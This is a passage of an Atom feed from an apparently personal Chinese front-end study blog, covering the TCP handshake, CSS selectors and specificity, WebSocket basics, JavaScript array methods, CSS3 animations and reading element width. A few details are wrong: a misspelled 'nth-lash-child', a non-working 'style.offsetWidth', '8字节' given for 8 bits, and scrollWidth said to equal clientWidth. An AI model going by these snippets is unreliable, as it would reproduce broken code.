&lt;p&gt;1、每方都需要知道对方的存在&lt;br&gt;2、允许双方协议一些参数（最大窗口值）&lt;br&gt;3、能对运输实体匹配&lt;/p&gt;
&lt;p&gt;####连接建立&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/gitcafe_tcp_connet.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;B的TCP服务器先建立TCB(传送控制块：存储了每个连接的重要信息，如TCP连接表，当前的发送和接受序号)&lt;/p&gt;
&lt;p&gt;&lt;b&gt;第一次连接&lt;/b&gt;：客户端A建立传送控制块TCB，向B发出请求。[控制位状态：同部位SYN=1,初始序号seq=x]&lt;/p&gt;
&lt;p&gt;&lt;b&gt;第二次连接&lt;/b&gt;：B服务端若同意建立则向A发送确认。[控制位状态：同部位SYN=1,确认ACK=1,初始序号seq=y,ack=x+1]&lt;/p&gt;
&lt;p&gt;&lt;b&gt;第三次连接&lt;/b&gt;：客户端A给出确认，TCP连接。[控制位状态：确认ACK=1,初始序号seq=x+1,ack=y+1]&lt;/p&gt;
&lt;p&gt;&lt;b&gt;第三次连接的目的&lt;/b&gt;：防止已失效的连接请求报文段突然又传到了B，因而产生错误。&lt;/p&gt;
&lt;p&gt;####连接释放&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xklhg.com1.z0.glb.clouddn.com/gitcafe_tcp_disconnet.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;B收到连接释放报文段后就立即发送确认，然后就进入close-wait状态，此时TCP服务器进程就通知高层应用进程.     因而从A到B的连接就释放了,&lt;/p&gt;
&lt;p&gt;此时是“半关闭”状态。即A不可以发送给B，但是B可以发送给A。若B没有数据报要发送给A了，其应用进程就通知TCP释放连接，然后发送给A连接释放报文段，并等待确认。&lt;br&gt;A发送确认后，进入time-wait。&lt;/p&gt;
&lt;p&gt;再经过时间等待计时器设置的&lt;b&gt;2MSL&lt;/b&gt;后，这样这段连接持续的时间内所产生的报文都会消失，才进入到close状态。&lt;/p&gt;
&lt;p&gt;&lt;b&gt;2MSL目的&lt;/b&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为了保证A发送的最后一个ACK报文段能够到达B。&lt;/li&gt;
&lt;li&gt;防止“已失效的连接请求报文段”出现在连接中&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;学习资料：《计算机网络》&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##TCP协议&lt;br&gt;今天和屌哥深入理解探讨了一下tcp协议，真的非常有意思！&lt;/p&gt;
&lt;p&gt;TCP的传输是面向字节流的，但是它的传送的数据单元确是&lt;b&gt;报文段&lt;/b&gt;。  其中的报文段理解透了就能掌握TCP的工作原理。&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="计算机网络" scheme="http://zchub.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>css selector</title>
    <link href="http://zchub.cn/2015/08/23/css-selector/"/>
    <id>http://zchub.cn/2015/08/23/css-selector/</id>
    <published>2015-08-23T20:17:42.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##css选择器&lt;/p&gt;
&lt;p&gt;每次看了东西又搞忘了，非要好好来总结一下才可以。这次学习的内容是关于css选择器。包括了以下内容。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;css(3)伪类选择器&lt;/li&gt;
&lt;li&gt;css选择器的权重与优先级&lt;/li&gt;
&lt;li&gt;css标签的匹配原理&lt;/li&gt;
&lt;li&gt;css优化&lt;/li&gt;
&lt;/ul&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;###css伪类选择器&lt;br&gt;css2中比较有特点的就是连接的伪类 :hover 、 :active 、 :link 、:visited&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;a:hover     动态伪类选择器：鼠标停留的元素   
a:active    动态伪类选择器：寻找被激活元素（链接被单击）
a:link      链接伪类选择器：没有被访问过的链接
a:visited   链接伪类选择器：访问过的伪类
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;举个例子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//css代码：
    a:link{text-decoration: none;}
    a:visited{text-decoration: underline;}
    a:hover{text-decoration: underline;color: blue;}
    a:active{text-decoration: none;color:#cccccc;}   

//html代码
&amp;lt;a href=&amp;quot;http://wangxizhu.gitcafe.io&amp;quot; target=&amp;quot;_blank&amp;quot;&amp;gt;个人博客&amp;lt;/a&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于css&lt;b&gt;层叠&lt;/b&gt;作用，所有要注意顺序。因为:link与:active将覆盖:hover与:visited。为了避免此问，以下为简记方式。&lt;/p&gt;
&lt;p&gt;书写顺序：LOve:HAte(爱恨)&lt;/p&gt;
&lt;p&gt;###css3新增选择器&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nth-child(2)    //选择属于其父元素的第二个子元素的每个 &amp;lt;p&amp;gt; 元素。  

nth-child(even) //元素的偶项，即兄弟元素奇偶可以通过关键字even和odd来实现，也可以通过2n与2n+1

nth-lash-child(n)  //与nth-child(n)相反，从后开始计数
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;常见例子&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;p:first-of-type //选择属于其父元素的首个 &amp;lt;p&amp;gt; 元素的每个 &amp;lt;p&amp;gt; 元素。
p:last-of-type  //选择属于其父元素的最后 &amp;lt;p&amp;gt; 元素的每个 &amp;lt;p&amp;gt; 元素。
p:only-of-type  //选择属于其父元素唯一的 &amp;lt;p&amp;gt; 元素的每个 &amp;lt;p&amp;gt; 元素。
p:only-child    //选择属于其父元素的唯一子元素的每个 &amp;lt;p&amp;gt; 元素。

:enabled        //启用的元素
:disabled       //禁用的元素
:checked        //选中的元素
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;###css选择器优先级与权重&lt;br&gt;选择器的优先级我们通常使用的内联是优先于外嵌的，而且id选择器也高于class选择器。&lt;br&gt;    !important &amp;gt; 内联 &amp;gt; ID &amp;gt; 类 &amp;gt; 标签 | 伪类 | 属性选择 &amp;gt; 伪对象 &amp;gt; 继承 &amp;gt; 通配符 通配符 &amp;gt; 继承&lt;/p&gt;
&lt;p&gt;####权重&lt;br&gt;1、通配选择符的权值 0,0,0,0&lt;/p&gt;
&lt;p&gt;2、标签的权值为 0,0,0,1&lt;/p&gt;
&lt;p&gt;3、类的权值为 0,0,1,0&lt;/p&gt;
&lt;p&gt;4、属性选择的权值为 0,0,1,(0,0,1,0)&lt;/p&gt;
&lt;p&gt;5、伪类选择的权值为 0,0,1,0&lt;/p&gt;
&lt;p&gt;6、伪对象选择的权值为 0,0,0,1&lt;/p&gt;
&lt;p&gt;7、ID的权值为 0,1,0,0&lt;/p&gt;
&lt;p&gt;8、!important的权值为最高 1,0,0,0&lt;/p&gt;
&lt;p&gt;结论：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;权值的大小跟选择器的类型和数量有关&lt;/li&gt;
&lt;li&gt;样式的优先级跟样式的定义顺序有关&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举个例子：&lt;a href=&quot;http://www.zhangxinxu.com/study/201208/256-class-fire-an-id.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;栗子&lt;/a&gt;(使用IE查看，FF、Chrome都修复了此bug)&lt;/p&gt;
&lt;p&gt;由于所有的类名(classes)都是以8字节字符串存储的。8字节所能hold的最大值就是255. 当同时出现256个class, 势必会越过其边缘，溢出到id区域。&lt;/p&gt;
&lt;p&gt;###css标签匹配原理&lt;br&gt;从右到左 如：DIV#divBox p span.red{color:red;} 先查找html中所有class=’red’的span元素，&lt;br&gt;找到后，再查找其父辈元素中是否有p元素，再判断p的父元素中是否有id为 divBox的div元素，&lt;br&gt;如果都存在则CSS匹配上。 目的：为了尽早过滤掉一些无关的样式规则和元素。&lt;/p&gt;
&lt;p&gt;学习资料:&lt;br&gt;&lt;a href=&quot;http://www.w3school.com.cn/cssref/css_selectors.asp&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.w3school.com.cn/cssref/css_selectors.asp&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/aaronjs/p/3156809.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/aaronjs/p/3156809.html&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##css选择器&lt;/p&gt;
&lt;p&gt;每次看了东西又搞忘了，非要好好来总结一下才可以。这次学习的内容是关于css选择器。包括了以下内容。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;css(3)伪类选择器&lt;/li&gt;
&lt;li&gt;css选择器的权重与优先级&lt;/li&gt;
&lt;li&gt;css标签的匹配原理&lt;/li&gt;
&lt;li&gt;css优化&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="css" scheme="http://zchub.cn/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>html5 webSocket</title>
    <link href="http://zchub.cn/2015/08/23/html5-webSocket/"/>
    <id>http://zchub.cn/2015/08/23/html5-webSocket/</id>
    <published>2015-08-23T01:34:26.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##WebSocket&lt;/p&gt;
&lt;p&gt;####定义&lt;br&gt;websocket是从客户端使用简单的语法有效地推动消息到服务器，那么就必须有服务器监听。&lt;br&gt;同时WebSocket允许跨域通信，而XHR却受到域的限制。&lt;/p&gt;
&lt;p&gt;####协议&lt;br&gt;属于自定义协议,ws(代替&lt;a href=&quot;http://)或wss(代替https://)协议，可用于任意的客户端和服务器程序。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://)或wss(代替https://)协议，可用于任意的客户端和服务器程序。&lt;/a&gt;&lt;br&gt;WebSocket协议基于TCP,进行双向通信的技术，PUSH技术类型.只需要一次握手。&lt;/p&gt;
&lt;p&gt;####自定义协议&lt;br&gt;&lt;b&gt;优点&lt;/b&gt;：client与server之间的发送数据少，适合移动应用&lt;br&gt;&lt;b&gt;缺点&lt;/b&gt;：可能存在安全性&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;####WebSocket API 的用法&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var socket = new WebSocket(&amp;apos;ws://localhost:8080&amp;apos;);   // 创建一个Socket实例


socket.onopen = function(event){                     // 打开Socket 

    socket.send(&amp;apos;这是一条初始化消息&amp;apos;);                  // 发送一个初始化消息

    socket.onmessage = function(event){              // 监听消息
        console.log(&amp;apos;已接受一条消息&amp;apos;,event);
    };


    socket.onclose = function(event){       // 监听Socket的关闭
        console.log(&amp;apos;Client notified socket has closed&amp;apos;,event);
    };

    //socket.close();           // 关闭Socket.... 
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####webSocket实例&lt;/p&gt;
&lt;p&gt;&lt;b&gt;客户端&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://wangxizhu.gitcafe.io/demo/websocket_fileupload/index.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;链接&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;b&gt;服务端&lt;/b&gt;|java实现&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://my.oschina.net/u/590484/blog/74054&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;学习地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;####代码问题&lt;br&gt;sun.misc.base64encoder报错&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/jbxiaozi/article/details/7351768&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;解决方法&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;####学习知识点&lt;br&gt;通过java的socket来实现服务端是挺容易，但这么文章很多数据处理上我是远远不及！如数据的位运算、掩码的处理。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##WebSocket&lt;/p&gt;
&lt;p&gt;####定义&lt;br&gt;websocket是从客户端使用简单的语法有效地推动消息到服务器，那么就必须有服务器监听。&lt;br&gt;同时WebSocket允许跨域通信，而XHR却受到域的限制。&lt;/p&gt;
&lt;p&gt;####协议&lt;br&gt;属于自定义协议,ws(代替&lt;a href=&quot;http://)或wss(代替https://)协议，可用于任意的客户端和服务器程序。&quot;&gt;http://)或wss(代替https://)协议，可用于任意的客户端和服务器程序。&lt;/a&gt;&lt;br&gt;WebSocket协议基于TCP,进行双向通信的技术，PUSH技术类型.只需要一次握手。&lt;/p&gt;
&lt;p&gt;####自定义协议&lt;br&gt;&lt;b&gt;优点&lt;/b&gt;：client与server之间的发送数据少，适合移动应用&lt;br&gt;&lt;b&gt;缺点&lt;/b&gt;：可能存在安全性&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="html5" scheme="http://zchub.cn/tags/html5/"/>
    
  </entry>
  
  <entry>
    <title>javascript array</title>
    <link href="http://zchub.cn/2015/08/19/javascript-array/"/>
    <id>http://zchub.cn/2015/08/19/javascript-array/</id>
    <published>2015-08-19T15:11:05.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##javascript数组&lt;br&gt;昨天在做阿里巴巴的面试题时发现针对JavaScript Array考的问题还有记到，而且都是考原生的方法。&lt;br&gt;但部分在w3c上都没有见过，于是就查看了资料弄个究竟。&lt;br&gt;这里就介绍了以下几个方法：sort()、forEach()、filter()、reduce()、join()&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;####sort()&lt;br&gt; &lt;b&gt;定义：&lt;/b&gt;sort方法是字符编码ASCII的顺序进行排序。    &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//比较字符串
var b=[&amp;apos;a&amp;apos;,&amp;apos;d&amp;apos;,&amp;apos;c&amp;apos;]
b.sort()        //b = [&amp;quot;a&amp;quot;, &amp;quot;c&amp;quot;, &amp;quot;d&amp;quot;]

//比较数字
var a=[0,5,10,15];      //0的ASCII码为48,1的ASCII码为49
a.sort();       //a = [0, 10, 15, 5]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt; 过程是通过比较两个参数值返回结果的大小来决定排列顺序,&lt;br&gt; 所以在比较数字的时候需要写函数来判断,如果结果&amp;gt;0，则交换顺序；结果&amp;lt;=0则不交换。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//正确地比较数字
sort(function compare(a,b){return b-a;})    //逆序
sort(function compare(a,b){return a-b;})    //顺序
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####forEach()&lt;br&gt; &lt;b&gt;定义：&lt;/b&gt;数组的每个元素都执行方法&lt;/p&gt;
&lt;p&gt; &lt;b&gt;表达式：&lt;/b&gt;array1.forEach(callbackfn[, thisArg])&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;array1 【必选】  一个数组对象。&lt;/li&gt;
&lt;li&gt;callbackfn【必选】 最多可以接受三个参数的函数。 对于数组中的每个元素，forEach 都会调用 callbackfn 函数一次。&lt;/li&gt;
&lt;li&gt;thisArg【可选】 callbackfn 函数中的 this 关键字可引用的对象。 如果省略 thisArg，则 undefined 将用作 this 值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;b&gt;例子&lt;/b&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//value为数字值，index为下标 ， ar该元素的数组对象，这里是letters；数组的每个元素执行都会调用callbackfn函数
function ShowResults(value, index, ar) { 
    document.write(&amp;quot;value: &amp;quot; + value); 
    document.write(&amp;quot; index: &amp;quot; + index); 
    document.write(&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;); 
} 
letters.forEach(ShowResults); 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####filter()&lt;br&gt;&lt;b&gt;定义：&lt;/b&gt; 在匹配过滤条件后，创建一个新的数组。所以不会改变原数组。&lt;/p&gt;
&lt;p&gt;&lt;b&gt;表达式：&lt;/b&gt;array1.filter(callbackfn[, thisArg])&lt;/p&gt;
&lt;p&gt;&lt;b&gt;callbackfn参数&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;语法：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function callbackfn(value,index,array1)
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;元素的值：[value]&lt;/li&gt;
&lt;li&gt;元素的索引:[index]&lt;/li&gt;
&lt;li&gt;被遍历的数组:[array1]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果为 filter 提供一个 thisArg 参数，则它会被作为 callback 被调用时的 this 值。&lt;br&gt;否则，callback 的 this 值在非严格模式下将是全局对象，严格模式下为 undefined。&lt;/p&gt;
&lt;p&gt;filter 遍历的元素范围在第一次调用 callback 之前就已经确定了。所以以后的操作不会遍历到！&lt;/p&gt;
&lt;p&gt;&lt;b&gt;示例&lt;/b&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;function isBigEnough(element) {
  return element &amp;gt;= 10;
}
var filtered = [12, 5, 8, 130, 44].filter(isBigEnough);
// filtered is [12, 130, 44]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####reduce()&lt;br&gt; &lt;b&gt;定义：&lt;/b&gt;数组缩减为一个数字。&lt;/p&gt;
&lt;p&gt; &lt;b&gt;表达式：&lt;/b&gt;array1.reduce(callbackfn,[initialValue])[其中不同于以上函数，reduce的callback的参数有&lt;b&gt;四个&lt;/b&gt;]&lt;/p&gt;
&lt;p&gt;&lt;b&gt;参数说明&lt;/b&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;previousValue  : 上一次调用回调返回的值，或者是提供的初始值(initialValue)&lt;/li&gt;
&lt;li&gt;currentValue  :  数组中当前被处理的元素&lt;/li&gt;
&lt;li&gt;index : 当前元素在数组中的索引&lt;/li&gt;
&lt;li&gt;array  :  调用的数组&lt;/li&gt;
&lt;li&gt;initialValue : 作为第一次调用 callback 的第一个参数&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;b&gt;示例&lt;/b&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[0,1,2,3,4].reduce(function(previousValue, currentValue, index, array){return previousValue + currentValue;});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;b&gt;数组扁平化&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;我的理解就是多维数组变为了一维数组。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var flattened =[[0,1],[2,3],[4,5]].reduce(function(a, b){return a.concat(b);});
// flattened is [0, 1, 2, 3, 4, 5]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####join()&lt;br&gt;一个数组的所有元素连接成为一个字符串。   &lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var ddd = [1,2,4,3,5];
var str = ddd.sort(function compare(a,b){return b-a;}).join(&amp;apos;+&amp;apos;);
// str = &amp;apos;5+4+3+2+1&amp;apos;;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####测试&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[&amp;quot;1&amp;quot;,&amp;quot;2&amp;quot;,&amp;quot;3&amp;quot;].map(parseInt) 输出结果为
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;输出函数的解析过程,代码如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//map的callbackfn传入的参数如下

var parseInt = function(value, index, array1) {
    return value + &amp;quot;-&amp;quot; + index+&amp;quot;-&amp;quot;+array1;       
    //[&amp;quot;1-0-1,2,3&amp;quot;, &amp;quot;2-1-1,2,3&amp;quot;, &amp;quot;3-2-1,2,3&amp;quot;]
};

[&amp;quot;1&amp;quot;, &amp;quot;2&amp;quot;, &amp;quot;3&amp;quot;].map(parseInt);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而parseInt可接受的参数为2个&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;parseInt(string, radix);        //string为解析的字符串；radix解析的数字的基数，值为[2~36]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以有&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;parseInt(&amp;quot;1&amp;quot;,&amp;quot;0&amp;quot;);      //1
parseInt(&amp;quot;2&amp;quot;,&amp;quot;1&amp;quot;);      //NaN
parseInt(&amp;quot;3&amp;quot;,&amp;quot;2&amp;quot;);      //NaN
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考资料：&lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/&lt;/a&gt;&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;##javascript数组&lt;br&gt;昨天在做阿里巴巴的面试题时发现针对JavaScript Array考的问题还有记到，而且都是考原生的方法。&lt;br&gt;但部分在w3c上都没有见过，于是就查看了资料弄个究竟。&lt;br&gt;这里就介绍了以下几个方法：sort()、forEach()、filter()、reduce()、join()&lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="javascript" scheme="http://zchub.cn/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>css3 animation</title>
    <link href="http://zchub.cn/2015/08/18/css3-animation/"/>
    <id>http://zchub.cn/2015/08/18/css3-animation/</id>
    <published>2015-08-18T23:12:15.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##css3动画示例&lt;br&gt;昨天在去哪儿的校招网上看到一个动画做得还不错就没忍住就多看了一下。于是看了看源码发现“哇哦，原来是这样的”&lt;br&gt;，在这里记下笔记。多学多看总是好滴！ &lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;pre&gt;&lt;code&gt;/**
 * 定义X轴弹性动画
 * @method elastic-x
 * 使用方式，code: 
   &amp;lt;div class=&amp;quot;ani elastic-x&amp;quot;...
*/

.ani{
      -webkit-animation-duration: 1s;
      animation-duration: 1s;

      -webkit-animation-fill-mode: both;
      animation-fill-mode: both;
}



.ani.infinite{
      -webkit-animation-iteration-count: infinite;
      animation-iteration-count: infinite;     /*    重复的次数 */
} 


@keyframes elastic-x{
    0%,20%,100%{
        transform: translate3d(0, 0, 0);
    }
    30%{
        transform: translate3d(20px, 0, 0);
    }
    50%{
        transform: translate3d(-20px, 0, 0);
    }
    65%{
        transform: translate3d(10px, 0, 0);
    }
    80%{
        transform: translate3d(-10px, 0, 0);
    }
    90%{
        transform: translate3d(5px, 0, 0);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而其他的淡入的动画就相对来说比较简单，只是显示了出来，并没有来回的动画。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;/* 淡入落下动画 */
@keyframes fade-in-down{
    0%{
        opacity: 0;
        transform: translate3d(0, -100%, 0);
    }
    100%{
        opacity: 1;
        transform: translate3d(0, 0, 0)
    }
}

/* 从左淡入动画 */
@keyframes fade-in-left{
    0%{
        opacity: 0;
        transform: translate3d(-100%, 0, 0);
    }
    100%{
        opacity: 1;
        transform: translate3d(0, 0, 0)
    }
}

/* 从右淡入动画 */
@keyframes fade-in-right{
    0%{
        opacity: 0;
        transform: translate3d(100%, 0, 0);
    }
    100%{
        opacity: 1;
        transform: translate3d(0, 0, 0)
    }
}


/* 向上淡入动画 */
@keyframes fade-in-up{
    0%{
        opacity: 0;
        transform: translate3d(0, 100%, 0);
    }
    100%{
        opacity: 1;
        transform: translate3d(0, 0, 0)
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;##css3 transform属性&lt;br&gt;这里主要是通过translate3d(x,y,z)来实现的。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;translate3d(x,y,z);         //分别定义在x、y、z轴上移动的距离
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在很多地方通过 translate(x,y)的方式也能实现。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;scale(x,y);         //2D缩放
scale3d(x,y,z)；    //3D缩放
rotate(angle);      //2D旋转
rotate3d(x,y,z,angle);  //3D旋转
skew(x-angle,y-angle);  //2D倾斜转换
&lt;/code&gt;&lt;/pre&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;##css3动画示例&lt;br&gt;昨天在去哪儿的校招网上看到一个动画做得还不错就没忍住就多看了一下。于是看了看源码发现“哇哦，原来是这样的”&lt;br&gt;，在这里记下笔记。多学多看总是好滴！ &lt;/p&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="front-end" scheme="http://zchub.cn/tags/front-end/"/>
    
      <category term="css3" scheme="http://zchub.cn/tags/css3/"/>
    
      <category term="animation" scheme="http://zchub.cn/tags/animation/"/>
    
  </entry>
  
  <entry>
    <title>通过js获取元素宽度</title>
    <link href="http://zchub.cn/2015/08/17/getWidthByJS/"/>
    <id>http://zchub.cn/2015/08/17/getWidthByJS/</id>
    <published>2015-08-17T17:17:11.000Z</published>
    <updated>2016-03-21T09:52:03.936Z</updated>
    
    <content type="html">&lt;p&gt;##js获取元素宽度&lt;br&gt;通常一般会想到的就是通过width来获取&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var demo_width = document.getElementById(&amp;quot;demo&amp;quot;).style.width;
&lt;/code&gt;&lt;/pre&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;p&gt;但是能通过这样的方式来获取的前提是在html代码中通过内嵌的方式定义的元素&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div id=&amp;quot;demo&amp;quot; style=&amp;quot;width:100px;height:100px;&amp;quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;那么如果我们如果是通过内联或者外联的写CSS样式就不能获取元素的宽度，那么我们就必须通过&lt;br&gt;offsetWidth或者clientWidth等其他方式来获取元素的宽度。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var demo_width = document.getElementById(&amp;quot;demo&amp;quot;).style.offsetWidth;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####clientWidth与offsetWidth的区别&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;clientWidth是元素的可见宽度[包含了padding的宽度：padding*2]&lt;/li&gt;
&lt;li&gt;offsetWidth是元素的宽度[包含了边框的宽度：border*2]&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;####getAttribute()来获取宽度&lt;br&gt;通过获取属性的值来获取宽度，那么宽度就必须定义在html的代码中&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;//定义html代码
&amp;lt;div id=&amp;quot;demo&amp;quot; width=&amp;quot;100px&amp;quot;&amp;gt;

//获取元素宽度
var demo_width = document.getElementById(&amp;quot;demo&amp;quot;).getAttribute(&amp;apos;width&amp;apos;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;####补充&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;element.offsetParent;       //返回元素的偏移容器
element.offsetTop;          //返回元素的垂直偏移位置
element.scrollWidth;        //返回元素的整体宽度,结果同clientwidth
&lt;/code&gt;&lt;/pre&gt;</content>
    
    <summary type="html">
    
      &lt;p&gt;##js获取元素宽度&lt;br&gt;通常一般会想到的就是通过width来获取&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var demo_width = document.getElementById(&amp;quot;demo&amp;quot;).style.width;
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="blog" scheme="http://zchub.cn/categories/blog/"/>
    
    
      <category term="javascript" scheme="http://zchub.cn/tags/javascript/"/>
    
      <category term="DOM" scheme="http://zchub.cn/tags/DOM/"/>
    
  </entry>
  
</feed>
